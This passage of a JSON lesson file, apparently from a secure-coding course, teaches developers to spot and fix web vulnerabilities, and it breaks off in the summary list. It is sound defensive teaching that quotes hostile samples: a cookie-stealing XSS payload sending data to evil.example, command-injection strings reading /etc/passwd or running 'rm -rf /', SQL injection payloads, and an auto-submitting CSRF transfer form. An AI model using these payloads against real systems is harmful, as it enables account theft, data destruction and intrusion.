@@ -1,0 +1,857 @@
+{
+  "id": "swe-web-security",
+  "name": "Secure Coding for the Web",
+  "version": "1.0.0",
+  "author": "Recurse",
+  "subject": "swe",
+  "level": "intermediate",
+  "description": "Spot and fix injection, XSS, CSRF, weak password storage, IDOR, leaked secrets, CORS mistakes and leaky logs.",
+  "icon": "Sec",
+  "language": "javascript",
+  "prereqs": [
+    "cybersecurity-101",
+    "http-web",
+    "swe-apis-rest",
+    "sql-basics"
+  ],
+  "tags": [
+    "security",
+    "owasp",
+    "xss",
+    "csrf",
+    "sql-injection",
+    "authentication",
+    "cors"
+  ],
+  "lesson": {
+    "estimatedMinutes": 30,
+    "intro": "Most security bugs are not exotic. They are ordinary code that trusts the wrong input: a string glued into SQL, a review rendered as HTML, an endpoint that never asks whose invoice this is. This lesson walks through the OWASP Top 10 themes you will meet as a developer, shows each bug in realistic code, and gives the fix you would write in a pull request.",
+    "objectives": [
+      "Spot SQL and command injection in code and fix them with parameters, argument lists and allowlists",
+      "Explain stored, reflected and DOM XSS and prevent them with output encoding and safe framework APIs",
+      "Defend against CSRF with SameSite cookies and tokens, and store passwords with Argon2id or bcrypt",
+      "Enforce access control on the server and prevent IDOR and mass assignment",
+      "Configure CORS, HSTS and CSP correctly, keep secrets out of git, and log without leaking data"
+    ],
+    "sections": [
+      {
+        "title": "Injection: SQL and command injection",
+        "body": "A support tool lets staff look up a customer by email. Another endpoint pings a host to check whether a partner's server is up. Both take a string from a user and hand it to an interpreter: a SQL database in one case, a shell in the other. That is the recipe for **injection**: untrusted input crossing into a place where it is parsed as code.\n\n**SQL injection** happens when input is glued into SQL text. With `f\"... WHERE email = '{email}'\"`, an attacker who types `' OR '1'='1' --` turns the query into one that matches every row, and other payloads can read whole tables with `UNION SELECT` or change data. The fix is **parameterized queries**, every time: placeholders in the SQL, values passed separately, so the database never parses them as SQL. ORMs do this for you, as long as nobody builds raw SQL with f-strings. For things placeholders cannot carry, such as a sort column or a table name, map the user's choice through an **allowlist** of known values.\n\n**Command injection** is the same mistake with a shell. `os.system(\"ping -c 1 \" + host)` runs whatever the shell sees, so a host of `8.8.8.8; cat /etc/passwd` runs two commands. Shells also expand `$(...)`, backticks, `&&`, pipes and redirections. The fixes, in order of preference:\n\n- Do not shell out at all if a library can do the job: an HTTP client, an image library, `shutil` for copying files.\n- Pass the program and its arguments as a **list** with `subprocess.run([...])` and no `shell=True`. No shell is involved, so `;` and `$()` are just characters inside one argument. In Node, use `execFile` or `spawn` with an argument array instead of `exec` with a template string.\n- **Validate input against an allowlist** of what you expect (a hostname pattern, or an IP address checked with `ipaddress.ip_address`) and reject everything else. Even without a shell, an argument that starts with `-` may be read as an option by the program (argument injection), so reject leading dashes or put `--` before user-supplied arguments where the program supports it.\n\nEvery injection bug has the same shape: data and code travel in the same string. The cure is always to keep them apart (parameters, argument lists) and to accept only input that matches what you expect.",
+        "code": "import ipaddress\nimport os\nimport subprocess\n\n# Vulnerable: the shell parses the whole string\nos.system(\"ping -c 1 \" + host)          # host = \"8.8.8.8; cat /etc/passwd\"\n\n# Safer: validate, then run without a shell, with arguments as a list\ndef ping(host: str) -> bool:\n    ipaddress.ip_address(host)          # raises ValueError unless it is an IP address\n    result = subprocess.run(\n        [\"ping\", \"-c\", \"1\", host],      # no shell: \";\" is just a character\n        capture_output=True, timeout=5,\n    )\n    return result.returncode == 0\n\n# SQL: parameters, never string formatting\ncur.execute(\"SELECT id, name FROM customers WHERE email = %s\", (email,))\n\n# Identifiers cannot be parameters: map the choice through an allowlist\nSORTS = {\"newest\": \"created_at DESC\", \"name\": \"name ASC\"}\norder_by = SORTS.get(request.args.get(\"sort\"), \"created_at DESC\")\ncur.execute(f\"SELECT id, name FROM customers ORDER BY {order_by} LIMIT 50\")\n# (only our own allowlisted text ever reaches the SQL)",
+        "language": "python",
+        "tip": "Grep a codebase for `shell=True`, `os.system`, `exec(` and f-strings that contain SELECT or WHERE. Those few searches find most injection bugs.",
+        "pitfall": "Blocklisting dangerous characters such as `;`, `'` and `--`. Attackers have encodings and alternatives you did not think of; use parameters, argument lists and allowlists instead.",
+        "activity": {
+          "type": "regex-tester",
+          "title": "Write an allowlist",
+          "prompt": "Allowlists beat blocklists. Write a pattern for each puzzle that accepts only the expected input and rejects everything else, including the injection attempts. Anchor both ends with ^ and $, or a payload can ride along after a valid prefix.",
+          "props": {
+            "puzzles": [
+              {
+                "prompt": "Accept a plain hostname: letters, digits, dots and hyphens, starting with a letter or digit.",
+                "match": [
+                  "example.com",
+                  "api.example.com",
+                  "db-01"
+                ],
+                "noMatch": [
+                  "example.com; cat /etc/passwd",
+                  "$(whoami)",
+                  "host && rm -rf /",
+                  "-v"
+                ]
+              },
+              {
+                "prompt": "Accept only the sort keys price, name or created_at, and nothing else.",
+                "match": [
+                  "price",
+                  "name",
+                  "created_at"
+                ],
+                "noMatch": [
+                  "price; DROP TABLE products",
+                  "name desc",
+                  "created_at--",
+                  "pricey"
+                ]
+              }
+            ]
+          }
+        },
+        "check": {
+          "question": "Why is `subprocess.run([\"ping\", \"-c\", \"1\", host])` safer than `os.system(\"ping -c 1 \" + host)`?",
+          "choices": [
+            "subprocess.run escapes every quote before passing the string to the shell",
+            "No shell parses the input, so characters like ; and $( ) stay inside one literal argument",
+            "It runs ping with lower operating system privileges",
+            "List arguments are encrypted before the call is made"
+          ],
+          "answer": 1,
+          "explanation": "With a list and no shell=True, the operating system starts ping directly with exactly those arguments. There is no shell to interpret ; or $( ), so no second command can be chained. It still pays to validate host, because of argument injection."
+        }
+      },
+      {
+        "title": "XSS: stored, reflected and DOM",
+        "body": "A product page shows customer reviews. One review contains `<img src=x onerror=\"fetch('https://evil.example/c?'+document.cookie)\">`. Every visitor's browser treats it as HTML, the broken image fires `onerror`, and the attacker's JavaScript runs inside your site: it can read the page, call your API as the victim, and steal any token a script can reach. That is **cross-site scripting (XSS)**: injection where the interpreter is the victim's browser.\n\nThree flavors, by where the payload comes from:\n\n- **Stored XSS**: the payload is saved (a review, a profile bio, a chat message) and served to every viewer. The most damaging kind.\n- **Reflected XSS**: the payload is in the request, usually the URL, and the server echoes it into the response, such as `/search?q=<script>...</script>` rendered as \"Results for ...\". The attacker sends victims a crafted link.\n- **DOM-based XSS**: the server is not involved. The page's own JavaScript takes something attacker-controlled (`location.hash`, a query parameter, `postMessage` data) and writes it into the page with `innerHTML`, `document.write` or `eval`.\n\nThe main defense is **output encoding**: convert special characters so the browser displays them as text instead of parsing them as markup. In HTML text, `<` becomes `&lt;`, `>` becomes `&gt;`, `&` becomes `&amp;`, and inside attributes quotes become `&quot;` and `&#39;`. Encoding must match the context. HTML text, an HTML attribute, a URL and a JavaScript string each have different rules, and a value placed in `href` also needs its scheme checked, because `javascript:alert(1)` contains nothing to escape.\n\nIn practice, let your framework do it. React, Vue, Angular, Jinja2 and Django templates escape text by default. XSS comes back through the escape hatches:\n\n- `element.innerHTML = userText` (use `textContent` instead),\n- React's `dangerouslySetInnerHTML`, Vue's `v-html`, Jinja's `|safe` and Django's `mark_safe`,\n- links built from user input, such as `<a href={user.website}>`: allow only `http:` and `https:` URLs.\n\nWhen you truly must render user-supplied HTML, as with a rich-text editor, pass it through a maintained sanitizer such as DOMPurify, which keeps an allowlist of safe tags and attributes. A Content Security Policy, covered later, is a second layer that limits the damage if something slips through.",
+        "code": "// DOM XSS: the URL fragment is written into the page as HTML\nconst name = decodeURIComponent(location.hash.slice(1))\ngreeting.innerHTML = `Welcome back, ${name}!`\n// https://shop.example/#<img src=x onerror=alert(document.cookie)>\n// (a <script> tag inserted through innerHTML would not run, but onerror does)\n\n// Fixed: treat it as text\ngreeting.textContent = `Welcome back, ${name}!`\n\n// React escapes text automatically: safe\n<p>{review.body}</p>\n\n// Escape hatch: unsafe with user input unless sanitized first\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(review.html) }} />\n\n// Links: check the scheme, or a javascript: URL runs code when clicked\nconst safeHref = /^https?:\\/\\//i.test(user.website) ? user.website : '#'",
+        "language": "javascript",
+        "tip": "In code review, search for innerHTML, dangerouslySetInnerHTML, v-html, |safe and mark_safe. Each one needs a reason and a sanitizer.",
+        "pitfall": "Sanitizing input once on the way in and trusting it everywhere afterward. Encode on output, for the context you are writing into; the same string may land in HTML, an attribute, a URL and JSON.",
+        "activity": {
+          "type": "code-runner",
+          "title": "Encode it",
+          "prompt": "Run it and read the encoded line: a browser would display it as text instead of building an img element. Then move the & replacement to the end of the chain and run again. The double-encoded &amp;lt; shows why & must be escaped first.",
+          "props": {
+            "language": "javascript",
+            "code": "function escapeHtml(text) {\n  return text\n    .replaceAll('&', '&amp;')    // must come first\n    .replaceAll('<', '&lt;')\n    .replaceAll('>', '&gt;')\n    .replaceAll('\"', '&quot;')\n    .replaceAll(\"'\", '&#39;')\n}\n\nconst review = '<img src=x onerror=\"alert(document.cookie)\">'\n\nconsole.log('Raw:     ' + review)\nconsole.log('Encoded: ' + escapeHtml(review))\n",
+            "task": "Run it, then reorder the replacements and see what breaks.",
+            "expectOutput": "Raw:     <img src=x onerror=\"alert(document.cookie)\">\nEncoded: &lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;"
+          }
+        },
+        "check": {
+          "question": "A search page shows `You searched for: ...` by inserting the `q` parameter from the URL into the server-rendered HTML without encoding. Which kind of XSS is this?",
+          "choices": [
+            "Reflected XSS",
+            "Stored XSS",
+            "DOM-based XSS",
+            "Cross-site request forgery"
+          ],
+          "answer": 0,
+          "explanation": "The payload travels in the request (the URL) and the server reflects it straight back into its response. Nothing is saved, so it is not stored XSS, and the server builds the HTML, so it is not DOM-based."
+        }
+      },
+      {
+        "title": "CSRF and SameSite cookies",
+        "body": "You are logged in to your bank in one tab. In another, you open a forum post containing a hidden form that auto-submits `POST https://bank.example/transfer` with `to=attacker&amount=500`. Your browser attaches the bank's session cookie, because cookies go to the site they belong to no matter which page started the request. The bank sees a valid session and moves the money. That is **cross-site request forgery (CSRF)**: the attacker cannot read anything, but can make your browser act as you.\n\nCSRF needs three things: the site authenticates with cookies (sent automatically), there is a state-changing action, and the request contains nothing the attacker cannot predict. The defenses remove one of them:\n\n- **SameSite cookies.** The `SameSite` attribute tells the browser when to send a cookie on requests started by another site. `Strict`: never cross-site, even when following a link (users arriving from an email link look logged out). `Lax`: sent on top-level navigations with safe methods, such as clicking a link, but not on cross-site POSTs, iframes, images or fetch calls; a good default for session cookies. `None`: always sent, and it requires `Secure`. Chrome treats cookies without the attribute as Lax, but other browsers differ, so always set it explicitly.\n- **CSRF tokens.** The server includes a random token in each form, or gives one to the frontend, and rejects state-changing requests that do not send it back. The attacker's page cannot read the token, so it cannot forge a valid request. Django, Rails and Laravel do this for you; do not disable it to make an error go away.\n- **Check the Origin header** on state-changing requests and reject unexpected origins.\n- **Never change state on GET.** A `GET /account/delete` can be triggered by simply navigating the victim to it, and SameSite=Lax still sends cookies on top-level GET navigations.\n\nAPIs that authenticate only with an `Authorization: Bearer` header added by your JavaScript are not exposed to classic CSRF, because browsers never attach that header on their own. Move the token into a cookie and CSRF is back on the table.\n\nOne subtlety: SameSite is about the **site** (scheme plus registrable domain, such as `https://example.com`), not the exact origin. `user-pages.example.com` and `app.example.com` are the same site, so a compromised subdomain or one hosting user content can still send same-site requests.",
+        "code": "<!-- On https://evil.example: submits itself as soon as the page loads -->\n<form action=\"https://bank.example/transfer\" method=\"POST\" id=\"f\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker\">\n  <input type=\"hidden\" name=\"amount\" value=\"500\">\n</form>\n<script>document.getElementById('f').submit()</script>\n\n# The defense, set by the bank when you log in:\nSet-Cookie: session=8f2c...; Path=/; Secure; HttpOnly; SameSite=Lax\n\n# With SameSite=Lax the cross-site POST arrives without the cookie,\n# so the bank sees an anonymous request and rejects it.",
+        "language": "plaintext",
+        "tip": "Set `Secure; HttpOnly; SameSite=Lax` on session cookies by default, and keep your framework's CSRF protection switched on.",
+        "pitfall": "Assuming a JSON API is safe because 'forms cannot send JSON'. Forms can send `text/plain` bodies that lenient servers parse, and a loose CORS policy opens more doors. Rely on SameSite, tokens and Origin checks.",
+        "check": {
+          "question": "Why does the forged transfer succeed when the session cookie has no SameSite protection?",
+          "choices": [
+            "The attacker's page can read the bank's cookie",
+            "The bank's server has been compromised",
+            "The browser attaches the bank's cookie to the cross-site request automatically",
+            "HTTPS is turned off on the bank's site"
+          ],
+          "answer": 2,
+          "explanation": "CSRF does not need to read or steal the cookie: the victim's browser sends it along with any request to the bank. SameSite, CSRF tokens and Origin checks each stop that forged request from being accepted."
+        }
+      },
+      {
+        "title": "Authentication and password storage",
+        "body": "A company's database leaks. The `users` table has a `password` column containing `5f4dcc3b5aa765d61d8327deb882cf99`. Attackers know within seconds that it means `password`: it is the MD5 of that word and sits in every precomputed lookup table online. How you store passwords decides whether a breach is an embarrassment or a catastrophe for every user who reused that password elsewhere.\n\nThe rules:\n\n- **Never store plaintext**, and never use reversible encryption. Anything that can be decrypted eventually will be.\n- **Never use a plain fast hash** such as MD5, SHA-1 or SHA-256 for passwords, even with a salt. They are built to be fast, and one GPU computes billions of them per second.\n- **Use a password hashing function**: **Argon2id** (the current first choice), **bcrypt** or scrypt. They are deliberately slow and tunable (a work factor or memory cost), and they generate a random **salt** per password and store it inside the hash string. Identical passwords get different hashes, and precomputed tables become useless.\n- **Verify with the library's check function** (`PasswordHasher.verify`, `bcrypt.checkpw`). It re-hashes the attempt with the stored salt and settings and compares safely. Never hash the attempt with a fresh salt and compare strings.\n\nThe rest of authentication matters just as much:\n\n- **Rate-limit login attempts** per account and per IP, and alert on bursts. Credential stuffing replays passwords leaked from other sites.\n- Offer or require **multi-factor authentication**.\n- Use one message for \"no such user\" and \"wrong password\" (\"Invalid email or password\"), so the form cannot be used to find out which emails have accounts. Do the same for password reset (\"If an account exists, we sent a link\").\n- **Regenerate the session id at login** (this prevents session fixation) and invalidate sessions at logout and on password change.\n- Make session cookies `HttpOnly`, `Secure` and `SameSite`, and expire them.\n- Password reset tokens should be long, random, single-use and short-lived, and stored hashed.\n- Do not invent your own scheme. Use your framework's authentication, a well-known library or an identity provider.",
+        "code": "# pip install argon2-cffi bcrypt\nfrom argon2 import PasswordHasher\nfrom argon2.exceptions import VerifyMismatchError\n\nph = PasswordHasher()                    # Argon2id with sensible defaults\n\nstored = ph.hash(\"correct horse battery staple\")\n# '$argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>'   salt and settings live in the string\n\ndef login_ok(stored_hash: str, attempt: str) -> bool:\n    try:\n        return ph.verify(stored_hash, attempt)\n    except VerifyMismatchError:\n        return False\n\n# bcrypt works the same way\nimport bcrypt\nh = bcrypt.hashpw(b\"correct horse battery staple\", bcrypt.gensalt())   # cost 12 by default\nbcrypt.checkpw(b\"correct horse battery staple\", h)                      # True\n\n# Never: hashlib.sha256(password.encode()).hexdigest()   (fast and unsalted)",
+        "language": "python",
+        "tip": "Inherited a table of old MD5 or SHA-256 hashes? Re-hash each password with Argon2id or bcrypt the next time that user logs in successfully, when you briefly have the plaintext.",
+        "pitfall": "Adding a salt to SHA-256 and calling it done. Salting defeats precomputed tables, but SHA-256 is still fast enough to try billions of guesses per second.",
+        "check": {
+          "question": "Why are bcrypt and Argon2id better than SHA-256 for storing passwords?",
+          "choices": [
+            "They produce shorter hashes that take less storage",
+            "They can be decrypted when a user forgets their password",
+            "SHA-256 is not actually a cryptographic hash function",
+            "They are deliberately slow and salted, so every guess costs an attacker far more"
+          ],
+          "answer": 3,
+          "explanation": "SHA-256 is a fine hash for integrity checks, but its speed makes password guessing cheap. Password hashing functions are slow by design, tunable as hardware improves, and salted per password. None of them can be decrypted."
+        }
+      },
+      {
+        "title": "Access control and IDOR",
+        "body": "Maya opens her invoice at `/api/invoices/1043`. Curious, she changes the URL to `/api/invoices/1042` and gets someone else's invoice, with their name, address and purchases. Nothing was hacked. The API checked that she was logged in and never checked whether invoice 1042 was hers. This is an **IDOR** (insecure direct object reference), and broken access control of this kind sits at the top of the OWASP Top 10 list of web application risks.\n\n**Authentication** answers \"who are you?\". **Authorization**, or access control, answers \"may you do this to this object?\". Most real breaches in this category are missing checks, not broken cryptography. The rules:\n\n- **Check on the server, on every request, for every object.** Hiding the admin button in the UI is not access control; anyone can call the API directly with curl.\n- **Deny by default.** A new endpoint should be closed until someone grants access, not open until someone remembers to restrict it. Middleware or decorators that require an explicit permission on every route help.\n- **Scope queries to the user.** Instead of loading by id and checking afterward, load by id **and** owner: `WHERE id = $1 AND owner_id = $2`. A missing row then means \"not found or not yours\", and you return 404 without revealing which.\n- **Never trust identity or roles from the client.** A `role`, `user_id` or `price` in the request body or a hidden form field is attacker-controlled. Take the user id from the authenticated session or token, and roles from your database.\n- **Watch for mass assignment.** `Users.update(id, req.body)` lets someone send `{\"role\": \"admin\"}`. Allowlist the fields a user may change.\n- Random ids (UUIDs) make guessing harder but are **not** a substitute for checks. Ids leak through URLs, logs, emails and shared links.\n\nTest access control like an attacker: log in as user A and replay user B's requests with A's session. Automated tests for \"A cannot read, edit or delete B's things\" catch regressions that code review misses.",
+        "code": "// Vulnerable: authenticated, but no ownership check (IDOR)\napp.get('/api/invoices/:id', requireLogin, async (req, res) => {\n  const result = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id])\n  if (!result.rows[0]) return res.status(404).end()\n  res.json(result.rows[0])\n})\n\n// Fixed: the query itself is scoped to the logged-in user\napp.get('/api/invoices/:id', requireLogin, async (req, res) => {\n  const result = await db.query(\n    'SELECT * FROM invoices WHERE id = $1 AND owner_id = $2',\n    [req.params.id, req.user.id]        // user id from the session, never the body\n  )\n  if (!result.rows[0]) return res.status(404).end()   // not found OR not yours\n  res.json(result.rows[0])\n})\n\n// Mass assignment: allowlist exactly what a user may change\nconst { displayName, bio } = req.body\nawait db.query('UPDATE users SET display_name = $1, bio = $2 WHERE id = $3',\n  [displayName, bio, req.user.id])",
+        "language": "javascript",
+        "tip": "For every endpoint that takes an id, ask: what stops user A from passing user B's id? 'They would not know it' is not an answer.",
+        "pitfall": "Enforcing permissions only in the frontend by hiding buttons and routes. The API is open to anyone with developer tools or curl.",
+        "check": {
+          "question": "Which change actually fixes the invoice IDOR?",
+          "choices": [
+            "Switching invoice ids from integers to random UUIDs",
+            "Scoping the query to the logged-in user: WHERE id = $1 AND owner_id = $2",
+            "Hiding links to other users' invoices in the UI",
+            "Requiring HTTPS on the invoices endpoint"
+          ],
+          "answer": 1,
+          "explanation": "Only a server-side ownership check stops Maya from reading invoice 1042. UUIDs make ids harder to guess but they still leak, hiding links changes nothing for someone using curl, and HTTPS protects the connection, not authorization."
+        }
+      },
+      {
+        "title": "Secrets and dependencies",
+        "body": "A developer commits a `.env` file to a public GitHub repository at 4:12 p.m. By 4:15 an automated scanner has found the cloud access key inside, and by evening the account is running cryptocurrency miners on hundreds of servers. Bots watch public commits continuously, so that timeline is realistic.\n\n**Secrets management** rules:\n\n- Secrets (API keys, database passwords, signing keys) never go in source code or in git. Load them from environment variables or a secret manager such as AWS Secrets Manager, Google Secret Manager, HashiCorp Vault or your platform's encrypted settings.\n- Add `.env` to `.gitignore` in the first commit, and commit a `.env.example` with placeholder values instead.\n- Turn on secret scanning: GitHub secret scanning and push protection, or tools such as gitleaks or trufflehog in a pre-commit hook and in CI.\n- Anything shipped to a browser or mobile app is public. In Vite, every variable prefixed `VITE_` is bundled into client code, and in Next.js every `NEXT_PUBLIC_` one. Never put a secret there; have the browser call your server, which holds the key.\n- Give each key the least privilege it needs, and use separate keys per environment, so a leaked development key cannot touch production.\n\nIf a secret leaks, **revoke and rotate it first**. Deleting the file in a new commit does not help: the secret stays in the git history and in every clone and fork. Rewriting history is cleanup, not the fix. Then check the provider's logs for misuse and find out how it leaked.\n\n**Dependency vulnerabilities.** A typical web app pulls in hundreds of transitive packages, and you ship all of them. Log4Shell, a 2021 flaw in the Java logging library Log4j, let attackers run code on servers that merely logged a crafted string, and it sat inside countless apps that never imported Log4j directly. The practices:\n\n- Commit **lockfiles** (`package-lock.json`, `poetry.lock`, `uv.lock`) so every build installs exactly the versions you tested.\n- Scan continuously with `npm audit` or `pip-audit`, and let Dependabot or Renovate open update pull requests. Prioritize severe vulnerabilities in code your app actually uses.\n- Be suspicious of new packages. Check the exact name (typosquats like `reqeusts`), the maintainers, download counts and recent ownership changes; install scripts run code on your machine.\n- Remove dependencies you do not use. Every package is attack surface.",
+        "code": "# Keep secrets out of git from day one\necho \".env\" >> .gitignore\necho \"PAYMENTS_API_KEY=replace-me\" > .env.example    # placeholders only\n\n# Read secrets from the environment at runtime (Python):\n#   api_key = os.environ[\"PAYMENTS_API_KEY\"]    # fails loudly if missing\n\n# Check dependencies for known vulnerabilities\nnpm audit            # JavaScript projects\npip-audit            # Python environments\n\n# A key leaked? Order matters:\n#   1. revoke or rotate it at the provider\n#   2. deploy the new key everywhere it is needed\n#   3. check the provider's logs for misuse\n#   4. clean the git history and turn on secret scanning",
+        "language": "bash",
+        "tip": "Treat every leaked secret as compromised, even if the repository was public for a minute or is private. Rotation is cheap; an incident is not.",
+        "pitfall": "Removing a committed key in the next commit and moving on. It is still in the history, in clones and forks, and probably already in a scanner's hands.",
+        "check": {
+          "question": "A teammate finds an API key that was committed last week and deleted in a later commit. What should happen first?",
+          "choices": [
+            "Nothing, because the key is no longer in the latest commit",
+            "Revoke and rotate the key at the provider",
+            "Rewrite the git history to remove it, and keep using the key",
+            "Make the repository private"
+          ],
+          "answer": 1,
+          "explanation": "The key may already have been copied from the history, a clone or a scanner. Revoking it makes any stolen copy useless; history rewriting and access changes are cleanup that comes after."
+        }
+      },
+      {
+        "title": "CORS, HTTPS, HSTS and security headers",
+        "body": "Your frontend at `app.example.com` calls `api.example.com`, and the console says the request was blocked by CORS policy. A teammate fixes it with `Access-Control-Allow-Origin: *`. Later, someone \"improves\" it by reflecting whatever origin the request came from, with credentials allowed. Both fixes misunderstand what CORS is.\n\nThe browser's **same-origin policy** stops JavaScript on one origin (scheme, host and port) from **reading** responses from another origin. **CORS** (cross-origin resource sharing) is how a server relaxes that: a response header such as `Access-Control-Allow-Origin: https://app.example.com` tells the browser which other origins may read the response. For requests that are not \"simple\" (JSON bodies, custom headers, methods such as PUT and DELETE), the browser first sends an `OPTIONS` **preflight** to ask permission.\n\nWhat CORS does **not** do:\n\n- It does not protect your server. Browsers enforce it when deciding whether a page may read a response; curl, scripts and attackers' servers ignore it completely. Authentication and authorization must still happen on every request.\n- It does not stop CSRF. A simple cross-site request, such as a form POST, is sent and processed by your server before the browser decides whether the page may read the answer.\n\nThe dangerous misconfiguration is reflecting the request's `Origin` while sending `Access-Control-Allow-Credentials: true`. Any website can then make requests with the user's cookies and read the answers: profiles, messages, API keys. (Browsers refuse `*` together with credentials, which is why people reach for reflection.) Use an explicit allowlist of your own origins.\n\n**HTTPS everywhere.** TLS encrypts and authenticates traffic, so nobody on the coffee shop Wi-Fi can read or change it. Redirect HTTP to HTTPS and add **HSTS** (`Strict-Transport-Security`), which tells the browser to use only HTTPS for your domain for the next `max-age` seconds, even if the user types `http://`. Browsers ignore the header when it arrives over plain HTTP, and the very first visit is only covered if your domain is on the browsers' HSTS preload list.\n\n**Security headers** add cheap, broad protection:\n\n- `Content-Security-Policy` (**CSP**) lists which sources may provide scripts, styles, images and frames. A strict policy such as `script-src 'self'` blocks inline scripts, inline event handlers and scripts from other domains, so an injected `<script>` or `onerror` does not run. Adding `'unsafe-inline'` to script-src throws most of that away; use nonces or hashes for the few inline scripts you need, and try a new policy first with `Content-Security-Policy-Report-Only`.\n- `frame-ancestors 'none'` in the CSP, or the older `X-Frame-Options: DENY`, stops other sites from framing your pages for clickjacking.\n- `X-Content-Type-Options: nosniff` stops browsers from guessing content types, such as running an uploaded \"image\" as a script.\n- `Referrer-Policy: strict-origin-when-cross-origin` keeps full URLs, which may contain tokens, from leaking to other sites.",
+        "code": "# CORS with an explicit allowlist (pseudocode)\nALLOWED = {\"https://app.example.com\", \"https://admin.example.com\"}\nif request.origin in ALLOWED:\n    Access-Control-Allow-Origin: <that exact origin>\n    Access-Control-Allow-Credentials: true\n    Vary: Origin\n\n# Headers on every HTML response\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';\n                         base-uri 'self'; frame-ancestors 'none'\nX-Content-Type-Options: nosniff\nReferrer-Policy: strict-origin-when-cross-origin",
+        "language": "plaintext",
+        "tip": "Check your headers in the browser's network tab or with a scanner such as Mozilla's HTTP Observatory before launch.",
+        "pitfall": "Treating CORS as protection for your API. It only decides which browser pages may read responses; it never stops a request from reaching your server.",
+        "check": {
+          "question": "What does CORS control?",
+          "choices": [
+            "Which clients may send requests to your server at all",
+            "Whether traffic between browser and server is encrypted",
+            "Which other origins' JavaScript may read your responses in a browser",
+            "Which users are currently logged in"
+          ],
+          "answer": 2,
+          "explanation": "CORS only relaxes the browser's same-origin policy for reading responses. Requests from curl or servers are never blocked by it, and it has nothing to do with encryption or login state."
+        }
+      },
+      {
+        "title": "Logging without leaking data",
+        "body": "An engineer adds a debug line to troubleshoot logins: `logger.info(f\"login attempt {email} {password}\")`. It ships. Six months later the logs, shipped to a third-party service, kept for a year and readable by forty people, hold several hundred thousand plaintext passwords. Logs are one of the most common places sensitive data leaks, precisely because nobody thinks of them as a database.\n\nNever log:\n\n- Passwords, even failed attempts (a typo is often one character away from the real password).\n- Session ids, access tokens, API keys, and the `Authorization` and `Cookie` headers.\n- Full payment card numbers, security codes, bank details and government ids.\n- Health data and other sensitive personal data, unless there is a clear need and controls around it.\n\nBe careful with whole objects. Logging `request.headers`, a request body or an entire user object pulls in fields you never thought about. Log specific, safe fields, and add a redaction filter as a safety net for known keys such as `password`, `token`, `authorization` and `card_number`. Prefer ids to personal data where they do the job: `user_id=8812` rather than an email.\n\n**Do log security events**, because they are how you notice an attack: logins and failed logins, password and MFA changes, permission denials, admin actions and validation failures, each with a timestamp, user id, source IP and request id. Missing this has its own entry in the OWASP Top 10: without logs and alerts, breaches go unnoticed for months.\n\nTwo more rules:\n\n- **Errors for users, details for logs.** Users get a generic message and a request id; stack traces, SQL and internal hostnames stay in the logs.\n- **Log injection.** If raw user input goes into plain-text logs, a value containing a newline can forge a fake log line, such as a username of `alice` followed by a newline and `INFO login succeeded user=admin`. Structured logging (JSON, one event per line, values as separate fields) prevents this and makes logs searchable.",
+        "code": "import logging\nlogger = logging.getLogger(\"auth\")\n\n# Bad: leaks the password and every header (cookies, tokens)\nlogger.info(f\"login attempt email={email} password={password} headers={request.headers}\")\n\n# Good: specific, safe fields, and ids instead of personal data where possible\nlogger.info(\"login_failed\", extra={\n    \"user_id\": user.id if user else None,\n    \"ip\": request.remote_addr,\n    \"request_id\": request_id,\n    \"reason\": \"bad_password\",\n})\n\n# Safety net: redact well-known sensitive keys before anything is written\nSENSITIVE = {\"password\", \"token\", \"authorization\", \"cookie\", \"card_number\"}\n\ndef redact(fields: dict) -> dict:\n    return {k: (\"[REDACTED]\" if k.lower() in SENSITIVE else v) for k, v in fields.items()}",
+        "language": "python",
+        "tip": "Search the codebase for log lines that format whole requests, headers, bodies or user objects. Each one is a leak waiting for the wrong field to be added.",
+        "pitfall": "Logging 'just for debugging' and forgetting to remove it. Debug lines ship, logs get copied to other systems, and they are kept far longer than you expect.",
+        "check": {
+          "question": "Which log line is safe to keep in production?",
+          "choices": [
+            "login failed email=dana@example.com password=hunter3",
+            "request headers: {'Authorization': 'Bearer eyJhbGciOi...'}",
+            "charge failed card=4111111111111111 cvc=123",
+            "login failed user_id=8812 ip=203.0.113.9 request_id=ab12"
+          ],
+          "answer": 3,
+          "explanation": "The last line records the security event with an id, an IP and a request id, which is everything you need to investigate. The others leak a password, a bearer token and full card details."
+        }
+      }
+    ],
+    "keyTerms": [
+      {
+        "term": "Injection",
+        "definition": "Untrusted input reaching an interpreter (SQL, a shell, the browser) and being run as code."
+      },
+      {
+        "term": "Parameterized query",
+        "definition": "SQL sent with placeholders and values passed separately, so input is never parsed as SQL."
+      },
+      {
+        "term": "XSS",
+        "definition": "Cross-site scripting: attacker-controlled script running in your site's pages, stored, reflected or DOM-based."
+      },
+      {
+        "term": "Output encoding",
+        "definition": "Converting special characters for the output context so the browser treats data as text."
+      },
+      {
+        "term": "CSRF",
+        "definition": "Cross-site request forgery: another site makes the victim's browser send an authenticated request."
+      },
+      {
+        "term": "SameSite cookie",
+        "definition": "A cookie attribute (Strict, Lax, None) controlling whether it is sent on cross-site requests."
+      },
+      {
+        "term": "Argon2id and bcrypt",
+        "definition": "Slow, salted password hashing functions designed to make guessing expensive."
+      },
+      {
+        "term": "IDOR",
+        "definition": "Insecure direct object reference: accessing another user's object by changing an id the server never checks."
+      },
+      {
+        "term": "Secret rotation",
+        "definition": "Revoking a credential and issuing a new one, the first step after any leak."
+      },
+      {
+        "term": "CORS",
+        "definition": "Headers that let other origins' JavaScript read your responses; it never blocks requests from reaching the server."
+      },
+      {
+        "term": "HSTS",
+        "definition": "Strict-Transport-Security: tells browsers to use only HTTPS for a domain for a set time."
+      },
+      {
+        "term": "Content Security Policy",
+        "definition": "A header listing allowed sources for scripts and other content, limiting the damage of XSS."
+      }
+    ],
+    "summary": [
+      "Injection mixes data and code: use parameterized queries, argument lists without a shell, and allowlists.",
+      "Prevent XSS with context-aware output encoding (let the framework do it), avoid innerHTML-style escape hatches, and sanitize HTML you must render.",
+      "Stop CSRF with SameSite cookies, CSRF tokens and Origin checks, and never change state on GET.",
+      "Store passwords with Argon2id or bcrypt, rate-limit logins, and keep login and reset messages generic.",
+      "Check authorization on the server for every object, keep secrets out of git and rotate any that leak, and scan dependencies.",
